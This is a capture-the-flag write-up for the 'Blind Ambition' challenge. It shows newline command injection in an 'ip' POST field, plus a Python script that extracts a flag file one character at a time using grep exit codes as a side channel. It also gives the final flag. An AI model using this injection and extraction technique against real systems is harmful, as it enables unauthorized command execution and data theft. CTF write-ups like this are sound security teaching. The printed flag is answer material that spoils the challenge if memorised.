# 6 - Blind Ambition

Once in a remote Norwegian town, a group of skilled security professionals had convened in a fancy cabin to collaborate and achieve their objectives. On their network, they found a number of challenges that required their collective expertise. Do you have what it takes to tackle these challenges too?

http://rsxc.no:9010

# Note

Number 3 to 6 I used a few minutes to check out, then I randomly tested if the flag was unprotected as it is in the same folder as the `index.php` and sure enough. I could just access `flag.txt` by adding that to the URL. So my points skyrocketed at that moment. 

I knew that was not the intended solution so even if I got the flag I wanted to complete it "legally" before continuing so I could write a proper writeup.

**Update**: This was fixed later on and flag is now in `/flag.txt`. This writeup still works the same just add a `/`

# Writup

I tested a few commands and saw I got a different output now. Here I can add an exit code.

```console
toffe@kali:~$ curl http://rsxc.no:9010 -d "ip=
exit 0"
```

This seems to return `Host is up, the results will be sent via e-mail.` and `down` if the last exit code is higher than 0.. Verified by `exit 0` and `exit 1`. So what mail? I tried for a long time to "intercept" the e-mail. But found nothing, then it dawned upon me that I get the exit code for the last command. Which allowes me to brute force the flag file with grep. If grep fails the "letter" is not there.

Side Channel attack at it's best. Using only uppercase as all the other flags have this. Also I know the flag starts with `RSXC{` then I can just grep for that + a letter and see if exit code is 0 or 1.

Had to use `.` and regexp grep as `{}` is blocked but `.` matches "any character".

```python
import string
import requests

flag = "RSXC."

while True:
    for char in string.ascii_uppercase+"_":
        url = 'http://rsxc.no:9010'
        data = {'ip': f"\ngrep -i {flag}{char} flag.txt"}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            if response.text.find("up") > 0:
                flag += char
                print(flag)
```

Now I get the flag slowly but truely.

# Flag

```
RSXC{I_SEE_YOU_MANAGED_TO_SEND_THE_RESPONSE_OUT_OF_BAND}
```